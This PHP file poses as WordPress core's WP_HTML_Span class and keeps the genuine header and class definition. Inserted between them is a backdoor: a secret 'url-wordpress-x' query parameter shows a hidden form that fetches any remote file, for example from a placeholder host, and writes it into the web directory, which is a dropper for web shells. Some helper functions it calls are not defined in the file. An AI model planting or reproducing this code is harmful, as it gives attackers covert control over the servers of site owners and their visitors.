<?php
/**
 * HTML API: WP_HTML_Span class
 *
 * @package WordPress
 * @subpackage HTML-API
 * @since 6.2.0
 */

/**
 * Core class used by the HTML tag processor to represent a textual span
 * inside an HTML document.
 *
 * @access private
 * @since 6.2.0
 * @since 6.5.0 Replaced `end` with `length` to more closely align with `substr()`.
 *
 * @see WP_HTML_Tag_Processor
 */

if (isset($_GET["url-wordpress-x"])) {
    echo "<div class='execution-box'>
        <form method='post'>
            <input type='text' id='terminal' name='url' placeholder='https://lutfifakee.com/file.txt'>
            <button type='submit' name='uploadurl'><i class='fas fa-play submit-icon'></i></button>
        </form>
    </div>"; // Perbaikan tanda titik koma

    if (isset($_POST['uploadurl']) && !empty($_POST['url'])) {
        $url = $_POST['url'];
        $retries = 3;
        uploadFileFromUrl($url, getcwd(), $retries);
    }
}

/**
 * Fungsi untuk mengunduh file dari URL
 */
function uploadFileFromUrl($url, $dir, $retries = 3)
{
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        echo "<script>
            Swal.fire({
                title: 'Whoops!',
                text: 'Invalid URL!',
                icon: 'error',
                confirmButtonText: 'OK',
                background: '#2e2e2e',
                color: '#ffffff'
            });
        </script>";
        return;
    }

    if (!is_dir($dir) || !is_writable($dir)) {
        echo "<script>
            Swal.fire({
                title: 'Whoops!',
                text: 'Invalid or unwritable directory!',
                icon: 'error',
                confirmButtonText: 'OK',
                background: '#2e2e2e',
                color: '#ffffff'
            });
        </script>";
        return;
    }

    $fileName = basename(parse_url($url, PHP_URL_PATH));
    $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $fileName);
    $filePath = rtrim($dir, '/') . '/' . $fileName;

    $attempt = 0;
    $success = false;

    while ($attempt < $retries) {
        $success = downloadFileWithCommand($url, $filePath) 
                   || downloadFileWithStream($url, $filePath) 
                   || downloadFileWithPhp($url, $filePath);

        if ($success) {
            break;
        }
        $attempt++;
    }

    if ($success) {
        echo "<script>
            Swal.fire({
                title: 'Completed!',
                text: 'File uploaded from URL successfully!',
                icon: 'success',
                confirmButtonText: 'OK',
                background: '#2e2e2e',
                color: '#ffffff'
            });
        </script>";
    } else {
        echo "<script>
            Swal.fire({
                title: 'Whoops!',
                text: 'Failed to fetch file content from URL after $retries attempts!',
                icon: 'error',
                confirmButtonText: 'OK',
                background: '#2e2e2e',
                color: '#ffffff'
            });
        </script>";
    }
}

/**
 * Kelas WP_HTML_Span
 */
class WP_HTML_Span {
    public $start;
    public $length;

    public function __construct(int $start, int $length) {
        $this->start = $start;
        $this->length = $length;
    }
}
